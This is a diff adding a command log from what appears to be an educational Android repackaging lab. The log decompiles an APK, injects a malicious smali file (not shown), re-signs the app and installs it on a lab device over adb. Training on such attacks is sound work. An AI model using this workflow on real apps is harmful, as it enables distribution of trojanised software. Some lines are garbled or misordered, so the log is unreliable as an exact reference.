@@ -1,0 +1,66 @@
+### All the commands in the repackaging lab are listed here ###
+
+--------------------------------------------------------------------------------------------------
+
+seed@VM:~$ ping -c 4 10.0.2.4
+x86_64:/ $ ping -c 4 10.0.2.15
+seed@VM:~$ cd Downloads 
+seed@VM:~/Downloads$ ls RepackagingLab.apk RepackagingLab.apk.zip 
+seed@VM:~/Downloads$ apktool d RepackagingLab
+
+--------------------------------------------------------------------------------------------------
+
+****Smali Code Injection*****
+
+--------------------------------------------------------------------------------------------------
+
+seed@VM:~/Downloads$ ls MaliciousCode.smali RepackagingLab.apk RepackagingLab
+RepackagingLab.apk.zip
+seed@VM:~/Downloads$ apktool b RepackagingLab
+seed@VM:~/Downloads$ cd RepackagingLab 
+seed@VM:~/.../RepackagingLab$ ls
+AndroidManifest.xml
+apktool.yml
+build original smali
+dist
+res
+
+--------------------------------------------------------------------------------------------------
+
+seed@VM:~/.../RepackagingLab$ cd dist [09/21/23] seed@VM:~/.../dist$ ls
+RepackagingLab.apk
+seed@VM:~/.../dist$ keytool -alias attack -genkey -v -keystore mykey.keystore
+Enter keystore password:
+Keystore password is too short - must be at least 6 cha racters
+Enter keystore password:
+Re-enter new password:
+
+--------------------------------------------------------------------------------------------------
+
+seed@VM:~/.../dist$ jarsigner -keystore mykey RepackagingLab.apk attack.keystore
+Enter Passphrase for keystore:
+jar signed.
+
+--------------------------------------------------------------------------------------------------
+
+seed@VM:~/.../dist$ adb disconnect
+* daemon not running. starting it now on port 5037 * * daemon started successfully *
+seed@VM:~/.../dist$ adb connect 10.0.2.4
+connected to 10.0.2.4:5555
+seed@VM:~/.../dist$ adb root
+restarting adbd as root
+seed@VM:~/.../dist$ adb devices
+List of devices attached
+seed@VM:~/.../dist$ adb connect 10.0.2.4
+connected to 10.0.2.4:5555
+seed@VM:~/.../dist$ adb install RepackagingLab.apk
+1813 KB/s (1427430 bytes in 0.768s)
+Success
+
+--------------------------------------------------------------------------------------------------
+
+seed@VM:~/.../dist$
+
+--------------------------------------------------------------------------------------------------
+
+### End ###
